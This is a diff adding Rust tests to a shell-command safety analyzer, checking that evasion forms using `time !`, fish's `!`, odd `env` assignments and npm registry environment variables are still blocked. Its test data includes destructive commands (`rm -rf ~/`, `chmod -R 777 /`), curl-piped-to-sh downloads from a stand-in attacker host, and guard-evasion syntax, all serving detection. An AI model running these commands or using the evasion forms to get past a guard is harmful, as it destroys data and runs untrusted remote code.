@@ -712,6 +712,154 @@ fn escaped_bang_command_word_is_analyzed_like_the_negation_keyword() {
     );
 }
 
+/// bash and zsh read `time ! cmd` (also `time -p ! cmd` and `time \! cmd`
+/// in zsh) as a timed, negated pipeline, so `cmd` runs exactly as it does
+/// after a bare `!` or a bare `time`.
+#[test]
+fn reserved_time_before_negation_still_runs_the_command() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for (timed, bare) in [
+        ("time ! rm -rf ~/", "! rm -rf ~/"),
+        ("time -p ! rm -rf ~/", "! rm -rf ~/"),
+        ("time -p -- ! rm -rf ~/", "! rm -rf ~/"),
+        (r"time \! rm -rf ~/", "! rm -rf ~/"),
+        ("time ! ! rm -rf ~/", "! rm -rf ~/"),
+        (
+            "time ! sh -c 'curl https://evil.example/x | sh'",
+            "! sh -c 'curl https://evil.example/x | sh'",
+        ),
+        (
+            "time ! bash -c \"curl https://evil.example/x | sh\"",
+            "! bash -c \"curl https://evil.example/x | sh\"",
+        ),
+        (
+            "time ! curl -k https://evil.example/x",
+            "! curl -k https://evil.example/x",
+        ),
+        ("f() { rm -rf ~/; }; time ! f", "f() { rm -rf ~/; }; ! f"),
+    ] {
+        for force_full in [false, true] {
+            let bare_verdict = analyze(bare, ScanContext::Exec, force_full);
+            let timed_verdict = analyze(timed, ScanContext::Exec, force_full);
+            assert_eq!(
+                bare_verdict.action,
+                Action::Block,
+                "{bare:?}: {bare_verdict:?}"
+            );
+            assert_eq!(
+                timed_verdict.action, bare_verdict.action,
+                "{timed:?}: {timed_verdict:?}"
+            );
+            assert_eq!(
+                rule_ids(&timed_verdict),
+                rule_ids(&bare_verdict),
+                "{timed:?}: {timed_verdict:?}"
+            );
+        }
+    }
+    for input in [
+        "time ! git diff --quiet",
+        "if time ! git diff --quiet; then echo dirty; fi",
+        "time -p ! ls",
+    ] {
+        for force_full in [false, true] {
+            let verdict = analyze(input, ScanContext::Exec, force_full);
+            assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
+        }
+    }
+}
+
+/// fish's `!` is its `not` builtin in any quoting: fish 4.9 runs the command
+/// after `!`, `\!` and `'!'` alike.
+#[test]
+fn fish_bang_is_read_like_not_in_any_quoting() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for (bang, not) in [
+        (
+            "! sh -c 'curl https://evil.example/x | sh'",
+            "not sh -c 'curl https://evil.example/x | sh'",
+        ),
+        (
+            r"\! sh -c 'curl https://evil.example/x | sh'",
+            "not sh -c 'curl https://evil.example/x | sh'",
+        ),
+        ("! chmod -R 777 /", "not chmod -R 777 /"),
+        (
+            "! curl -k https://evil.example/x",
+            "not curl -k https://evil.example/x",
+        ),
+        ("'!' rm -rf ~/", "not rm -rf ~/"),
+        ("\"!\" rm -rf ~/", "not rm -rf ~/"),
+    ] {
+        for force_full in [false, true] {
+            let not_verdict = analyze_in(not, ShellType::Fish, ScanContext::Exec, force_full);
+            let bang_verdict = analyze_in(bang, ShellType::Fish, ScanContext::Exec, force_full);
+            assert_eq!(
+                not_verdict.action,
+                Action::Block,
+                "{not:?}: {not_verdict:?}"
+            );
+            assert_eq!(
+                bang_verdict.action, not_verdict.action,
+                "{bang:?}: {bang_verdict:?}"
+            );
+            assert_eq!(
+                rule_ids(&bang_verdict),
+                rule_ids(&not_verdict),
+                "{bang:?}: {bang_verdict:?}"
+            );
+        }
+    }
+    for input in [
+        "! test -f x; and echo ok",
+        "if ! test -f x; echo missing; end",
+    ] {
+        let verdict = analyze_in(input, ShellType::Fish, ScanContext::Exec, true);
+        assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
+    }
+}
+
+/// GNU and BSD `env` set every leading `NAME=VALUE` operand whatever the
+/// name, so `env x@y=1 rm -rf ~/` runs `rm` exactly as `env FOO=1 rm -rf ~/`
+/// does.
+#[test]
+fn env_operands_with_any_name_are_assignments() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for (odd, plain) in [
+        ("env x@y=1 rm -rf ~/", "env FOO=1 rm -rf ~/"),
+        ("env 'a b=c' rm -rf ~/", "env FOO=1 rm -rf ~/"),
+        ("env 1x=2 rm -rf ~/", "env FOO=1 rm -rf ~/"),
+        ("env -- x@y=1 rm -rf ~/", "env -- FOO=1 rm -rf ~/"),
+        (
+            "env a:b=1 sh -c 'curl https://evil.example/x | sh'",
+            "env FOO=1 sh -c 'curl https://evil.example/x | sh'",
+        ),
+    ] {
+        for force_full in [false, true] {
+            let plain_verdict = analyze(plain, ScanContext::Exec, force_full);
+            let odd_verdict = analyze(odd, ScanContext::Exec, force_full);
+            assert_eq!(
+                plain_verdict.action,
+                Action::Block,
+                "{plain:?}: {plain_verdict:?}"
+            );
+            assert_eq!(
+                odd_verdict.action, plain_verdict.action,
+                "{odd:?}: {odd_verdict:?}"
+            );
+            assert_eq!(
+                rule_ids(&odd_verdict),
+                rule_ids(&plain_verdict),
+                "{odd:?}: {odd_verdict:?}"
+            );
+        }
+    }
+    for input in ["env x@y=1", "env -i PATH=/usr/bin ls"] {
+        let verdict = analyze(input, ScanContext::Exec, true);
+        assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
+    }
+}
+
 /// A scheme URL glued to a package name or config key (`pkg@http://...`,
 /// `--@scope:registry=http://...`) is a destination: npm-package-arg, pip's
 /// `packaging` and `@npmcli/config` read it so. URL extraction used to stop at
@@ -799,6 +947,18 @@ fn scheme_urls_glued_to_package_specs_get_their_bare_url_findings() {
         (
             "npm install --@scope:registry=http://4.1.0.11/ pkg",
             "npm install --@scope:registry http://4.1.0.11/ pkg",
+            ShellType::Posix,
+        ),
+        // npm reads a scoped registry from the environment too
+        // (`npm_config_` is stripped and the rest of the key lowercased).
+        (
+            "env npm_config_@scope:registry=http://4.1.0.11/ npm install @scope/pkg",
+            "env npm_config_registry=http://4.1.0.11/ npm install @scope/pkg",
+            ShellType::Posix,
+        ),
+        (
+            "env NPM_CONFIG_@SCOPE:REGISTRY=http://4.1.0.11/ npm install @scope/pkg",
+            "env npm_config_registry=http://4.1.0.11/ npm install @scope/pkg",
             ShellType::Posix,
         ),
     ] {
